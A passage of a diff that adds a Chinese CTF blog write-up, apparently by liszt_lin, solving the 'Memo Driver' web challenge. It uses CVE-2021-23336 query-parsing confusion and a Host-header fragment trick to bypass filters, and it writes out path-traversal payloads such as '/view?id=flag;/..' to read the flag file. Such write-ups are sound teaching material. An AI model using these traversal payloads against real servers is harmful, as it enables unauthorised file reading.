port=11000)</span><br></pre></td></tr></table></figure>
+
+<p>四个路由分别对应了之前网页的四个功能，接下来最重要的是就是找rce或文件读取的点，发现在<code>/view</code>路由中存在文件读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = open(path, &#x27;r&#x27;)</span><br><span class="line">contents = f.readlines()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>那么我们就要将path读到flag，那重点还是在这个<code>/view</code>路由中，分析函数，发现不能存在<code>.</code>和<code>&amp;</code>。不过由于题目的python是3.9.0的，因此存在CVE-2021-23336漏洞，这个CVE会把<code>;</code>當作<code>&amp;</code>。</p>
+<p>这样的话，利用query_params的错误解析，当value以;分割后，query_params会截取;前半部分，而query_params.keys()会将key和a;后面的b,c当作key。</p>
+<p>那么如果我们构建这样的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view?id=flag;/..</span><br></pre></td></tr></table></figure>
+
+<p>request.url直接raw URL，沒有进行decode，然后request.url.query也是沒有decode，之后到了request.query_params的被解析成两个params:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=flag</span><br><span class="line">/..=</span><br></pre></td></tr></table></figure>
+<p>而最后在request.query_params.keys()的時候被decode，结合起来的path就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./memo/id/../flag</span><br></pre></td></tr></table></figure>
+
+<p>flag在<code>./memo/flag</code>这样就成功读取到了flag。</p>
+<p>后来看了另一个大佬的wp，发现还有一个更神奇的操作可以构造path，利用到的是Host header，payload是这样构建的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#/view?id=flag&amp;/..</span><br></pre></td></tr></table></figure>
+
+<p>这样payload传入后，request.url.query完全是空的，但是request.query_params依然存在，因此检查就被绕过，达到绕过的效果。</p>
+<p>这种方法的原理大概就是，request.url是从Host header构造而来的，Host后如果加了个<code>#</code>，之后的部分都被当成fragment来解析，而不是 query string，所以request.url.query置空了。而request.query_params是直接拿最原始的query string，因此被保留了。</p>
+<p>path构造出来仍是<code>./memo/id/../flag</code>，不过我在buu没有这个方法复现成功，可能是平台解析的问题。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/04/16/buu%E7%BB%83%E4%B9%A08/" rel="next" title="buu练习8">
+                <i class="fa fa-chevron-left"></i> buu练习8
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BB"><span class="nav-number"></span> <span class="nav-text">BB</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gotm"><span class="nav-number"></span> <span class="nav-text">gotm</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Memo-Driver"><span class="nav-number"></span> <span class="nav-text">Memo Driver</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
